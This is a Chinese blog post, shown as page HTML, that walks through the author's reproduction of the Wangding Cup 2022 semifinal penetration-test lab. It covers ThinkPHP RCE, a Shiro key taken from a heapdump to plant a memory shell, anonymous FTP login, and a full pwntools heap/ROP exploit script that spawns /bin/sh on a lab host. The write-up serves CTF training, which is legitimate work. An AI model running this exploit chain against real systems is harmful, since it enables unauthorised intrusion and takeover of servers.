@@ -1,0 +1,1000 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/biaotou.png">
+  <link rel="icon" href="/img/biaotou.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="orange">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="flag01 利用fscan进行扫描发现有thinkphp,利用工具扫描getshell连接拿到flag1   上传fscan在内网扫描一下内容 用ai总结了一下    IP地址 开放端口&#x2F;服务 版本&#x2F;系统信息 漏洞名称 风险等级 利用方式&#x2F;影响 修复建议     172.28.23.26 21&#x2F;FTP (vsFTPd) vsFTPd 3.0.3 (Ubuntu) 匿名登录漏洞 中高危 可下载O">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网鼎杯2022半决赛复现">
+<meta property="og:url" content="https://0ran9ewww.github.io/2025/05/19/%E6%B8%97%E9%80%8F/GreatWall/index.html">
+<meta property="og:site_name" content="0raN9e的笔记">
+<meta property="og:description" content="flag01 利用fscan进行扫描发现有thinkphp,利用工具扫描getshell连接拿到flag1   上传fscan在内网扫描一下内容 用ai总结了一下    IP地址 开放端口&#x2F;服务 版本&#x2F;系统信息 漏洞名称 风险等级 利用方式&#x2F;影响 修复建议     172.28.23.26 21&#x2F;FTP (vsFTPd) vsFTPd 3.0.3 (Ubuntu) 匿名登录漏洞 中高危 可下载O">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-02211331.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-02211435.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08101155.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08101457.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08140459.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08141231.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08142915.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08143918.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08144047.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08145556.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08145503.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19163656.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172043.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172357.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19172548.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19173211.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19173405.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19165635.png">
+<meta property="og:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-19174705.png">
+<meta property="article:published_time" content="2025-05-19T13:30:00.000Z">
+<meta property="article:modified_time" content="2025-05-19T13:34:40.968Z">
+<meta property="article:author" content="orange">
+<meta property="article:tag" content="横向移动">
+<meta property="article:tag" content="thinkphp">
+<meta property="article:tag" content="shiro">
+<meta property="article:tag" content="k8s">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://0ran9ewww.github.io/images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-02211331.png">
+  
+  
+  
+  <title>网鼎杯2022半决赛复现 - 0raN9e的笔记</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"0ran9ewww.github.io","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"mhU37D1jfBAPsc6SNIXmdLb0-gzGzoHsz","app_key":"z8mFsDgOSQqDw1luWGGbCaCR","server_url":"https://mhu37d1j.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>0raN9e的blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="网鼎杯2022半决赛复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-19 21:30" pubdate>
+          2025年5月19日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          27 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">网鼎杯2022半决赛复现</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年5月19日 晚上
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="flag01"><a class="markdownIt-Anchor" href="#flag01"></a> flag01</h1>
+<p>利用fscan进行扫描发现有thinkphp,利用工具扫描getshell连接拿到flag1</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-02211331.png" srcset="/img/loading.gif" lazyload alt="2025-05-02211331"></p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-02211435.png" srcset="/img/loading.gif" lazyload alt="2025-05-02211435"></p>
+<p>上传fscan在内网扫描一下内容</p>
+<p>用ai总结了一下</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left"><strong>IP地址</strong></th>
+<th style="text-align:left"><strong>开放端口/服务</strong></th>
+<th style="text-align:left"><strong>版本/系统信息</strong></th>
+<th style="text-align:left"><strong>漏洞名称</strong></th>
+<th style="text-align:left"><strong>风险等级</strong></th>
+<th style="text-align:left"><strong>利用方式/影响</strong></th>
+<th style="text-align:left"><strong>修复建议</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><strong>172.28.23.26</strong></td>
+<td style="text-align:left">21/FTP (vsFTPd)</td>
+<td style="text-align:left">vsFTPd 3.0.3 (Ubuntu)</td>
+<td style="text-align:left">匿名登录漏洞</td>
+<td style="text-align:left">中高危</td>
+<td style="text-align:left">可下载<code>OASystem.zip</code>，泄露敏感数据</td>
+<td style="text-align:left">禁用匿名登录，检查并删除暴露文件</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">22/SSH</td>
+<td style="text-align:left">OpenSSH 7.2p2 Ubuntu</td>
+<td style="text-align:left">暂无直接漏洞</td>
+<td style="text-align:left">低</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">升级OpenSSH，禁用密码登录</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">80/HTTP (Apache)</td>
+<td style="text-align:left">Apache 2.4.18</td>
+<td style="text-align:left">新翔OA管理系统（暴露联系方式）</td>
+<td style="text-align:left">中</td>
+<td style="text-align:left">可能存在业务逻辑漏洞</td>
+<td style="text-align:left">检查Web应用安全性，限制敏感信息暴露</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>172.28.23.33</strong></td>
+<td style="text-align:left">22/SSH</td>
+<td style="text-align:left">OpenSSH 8.2p1 Ubuntu</td>
+<td style="text-align:left">暂无直接漏洞</td>
+<td style="text-align:left">低</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">升级OpenSSH，禁用密码登录</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">8080/HTTP (SpringBoot)</td>
+<td style="text-align:left">智联科技ERP后台</td>
+<td style="text-align:left">SpringBoot Actuator堆转储泄露</td>
+<td style="text-align:left">高危</td>
+<td style="text-align:left">泄露内存数据（如数据库密码）</td>
+<td style="text-align:left">关闭Actuator未授权访问，修改敏感凭据</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left"></td>
+<td style="text-align:left">SpringBoot Env未授权访问</td>
+<td style="text-align:left">高危</td>
+<td style="text-align:left">读取环境变量、配置信息</td>
+<td style="text-align:left">限制<code>/env</code>端点访问权限</td>
+</tr>
+<tr>
+<td style="text-align:left"><strong>172.28.23.17</strong></td>
+<td style="text-align:left">22/SSH</td>
+<td style="text-align:left">OpenSSH 8.2p1 Ubuntu</td>
+<td style="text-align:left">暂无直接漏洞</td>
+<td style="text-align:left">低</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">升级OpenSSH，禁用密码登录</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">80/HTTP (Apache)</td>
+<td style="text-align:left">Apache 2.4.41</td>
+<td style="text-align:left">无标题页面（需进一步测试）</td>
+<td style="text-align:left">待定</td>
+<td style="text-align:left">-</td>
+<td style="text-align:left">检查网站内容，确认是否存在隐藏漏洞</td>
+</tr>
+<tr>
+<td style="text-align:left"></td>
+<td style="text-align:left">8080/HTTP (ThinkPHP)</td>
+<td style="text-align:left">ThinkPHP 5.0.23</td>
+<td style="text-align:left">ThinkPHP 5.0.23远程代码执行（RCE）</td>
+<td style="text-align:left">严重</td>
+<td style="text-align:left">直接获取服务器控制权</td>
+<td style="text-align:left">立即升级ThinkPHP或禁用该端口</td>
+</tr>
+</tbody>
+</table>
+<h1 id="flag03"><a class="markdownIt-Anchor" href="#flag03"></a> flag03</h1>
+<p>先对33分析一下，扫描一下内容</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08101155.png" srcset="/img/loading.gif" lazyload alt="2025-05-08101155"></p>
+<p>下载一下heapdump看一下内容</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">java <span class="hljs-literal">-jar</span> JDumpSpider<span class="hljs-literal">-1</span>.<span class="hljs-number">1</span><span class="hljs-literal">-SNAPSHOT-full</span>.jar C:\Users\<span class="hljs-number">0</span>raN9e\Desktop\春秋云镜\heapdump<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08101457.png" srcset="/img/loading.gif" lazyload alt="2025-05-08101457"></p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">===========================================<br>CookieRememberMeManager(ShiroKey)<br>-------------<br>algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES<br><br>===========================================<br></code></pre></td></tr></table></figure>
+<p>写一个shiro内存马进去</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08140459.png" srcset="/img/loading.gif" lazyload alt="2025-05-08140459"></p>
+<p>看了一下不是root权限</p>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08141231.png" srcset="/img/loading.gif" lazyload alt="2025-05-0841231"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/home/ops01 &gt;<span class="hljs-built_in">ls</span><br><br>HashNote<br></code></pre></td></tr></table></figure>
+<p>下载下来分析一下</p>
+<p>是一个pwn题，不会pwn直接用网上的脚本跑一下吧</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash">/ &gt;netstat -antlp<br><br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    <br>tcp        0      0 0.0.0.0:59696           0.0.0.0:*               LISTEN      -                   <br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   <br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   <br>tcp        0      0 172.28.23.33:58428      100.100.0.3:80          TIME_WAIT   -                   <br>tcp        0      0 172.28.23.33:50218      100.100.145.133:80      TIME_WAIT   -                   <br>tcp        0      0 172.28.23.33:46490      100.100.145.133:80      TIME_WAIT   -                   <br>tcp        0      0 172.28.23.33:59764      100.100.145.133:80      TIME_WAIT   -                   <br>tcp        0      0 172.28.23.33:53762      100.100.30.25:80        ESTABLISHED -                   <br>tcp        0      0 172.28.23.33:57550      100.100.145.133:80      TIME_WAIT   -                   <br>tcp6       0      0 :::8080                 :::*                    LISTEN      667/java            <br>tcp6       0      0 172.28.23.33:8080       172.28.23.17:60456      ESTABLISHED 667/java            <br>(Not all processes could be identified, non-owned process info<br> will not be shown, you would have to be root to see it all.)<br></code></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">key,data=<span class="hljs-string">&#x27;b&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">key</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&quot;Key: &quot;</span>,key);<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">key,data</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,key)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Data:&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">name</span>(<span class="hljs-params">username</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;name:&#x27;</span>,username)<br><br><br>p = remote(<span class="hljs-string">&#x27;172.28.23.33&#x27;</span>, <span class="hljs-number">59696</span>)<br><span class="hljs-comment"># p = process(&#x27;./HashNote&#x27;)</span><br><br><br>username=<span class="hljs-number">0x5dc980</span><br>stack=<span class="hljs-number">0x5e4fa8</span><br>ukey=<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">5</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x10</span>,<br>    <span class="hljs-number">0x10</span>:[username+<span class="hljs-number">0x20</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x30</span>:[stack,<span class="hljs-number">0x10</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;name&#x27;</span>,fake_chunk)<br>p.sendlineafter(<span class="hljs-string">b&#x27;word&#x27;</span>,<span class="hljs-string">&#x27;freep@ssw0rd:3&#x27;</span>)<br><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">1</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 126</span><br>add(<span class="hljs-string">b&#x27;\x30&#x27;</span>*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x31&#x27;</span>+<span class="hljs-string">b&#x27;\x44&#x27;</span>,<span class="hljs-string">b&#x27;test&#x27;</span>)   <span class="hljs-comment"># 127</span><br><br><br>show(ukey)<br>main_ret=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x1e0</span><br><br><br><br><br>rdi=<span class="hljs-number">0x0000000000405e7c</span> <span class="hljs-comment"># pop rdi ; ret</span><br>rsi=<span class="hljs-number">0x000000000040974f</span> <span class="hljs-comment"># pop rsi ; ret</span><br>rdx=<span class="hljs-number">0x000000000053514b</span> <span class="hljs-comment"># pop rdx ; pop rbx ; ret</span><br>rax=<span class="hljs-number">0x00000000004206ba</span> <span class="hljs-comment"># pop rax ; ret</span><br>syscall=<span class="hljs-number">0x00000000004560c6</span> <span class="hljs-comment"># syscall</span><br><br>fake_chunk=flat(&#123;<br>    <span class="hljs-number">0</span>:username+<span class="hljs-number">0x20</span>,<br>    <span class="hljs-number">0x20</span>:[username+<span class="hljs-number">0x30</span>,<span class="hljs-built_in">len</span>(ukey),\<br>        ukey,<span class="hljs-number">0</span>],<br>    <span class="hljs-number">0x40</span>:[main_ret,<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>]<br>    &#125;,filler=<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br><br>name(fake_chunk.ljust(<span class="hljs-number">0x80</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><br>payload=flat([<br>    rdi,username+<span class="hljs-number">0x50</span>,<br>    rsi,<span class="hljs-number">0</span>,<br>    rdx,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    rax,<span class="hljs-number">0x3b</span>,<br>    syscall<br>    ])<br><br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Key:&#x27;</span>,ukey)<br>p.sendline(payload)<br>p.sendlineafter(<span class="hljs-string">b&#x27;Option:&#x27;</span>,<span class="hljs-string">b&#x27;9&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+<p><img src="/../../images/%E6%B8%97%E9%80%8F/ccb2024/2025-05-08142915.png" srcset="/img/loading.gif" lazyload alt="Screenshot 2025-05-08 142915"></p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag03</span>: flag&#123;<span class="hljs-number">6</span>a326f94-<span class="hljs-number">6526</span>-<span class="hljs-number">4586</span>-<span class="hljs-number">8233</span>-<span class="hljs-number">152</span>d137281fd&#125;<br></code></pre></td></tr></table></figure>
+<h1 id="flag02"><a class="markdownIt-Anchor" href="#flag02"></a> flag02</h1>
+<p>直接匿名登录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# proxychains4 ftp 172.28.23.26   <br>[proxychains] config file found: /etc/proxychains4.conf<br>[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4<br>[proxychains] DLL init: proxychains-ng 4.17<br>[proxychains] Dynamic chain  ...  27.25.151.99:6000  ...  172.28.23.26:21  ...  OK<br>Connected to 172.28.23.26.<br>220 (vsFTPd 3.0.3)<br>Name (172.28.23.26:orange): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br></code></pre></td></tr></table></figure>
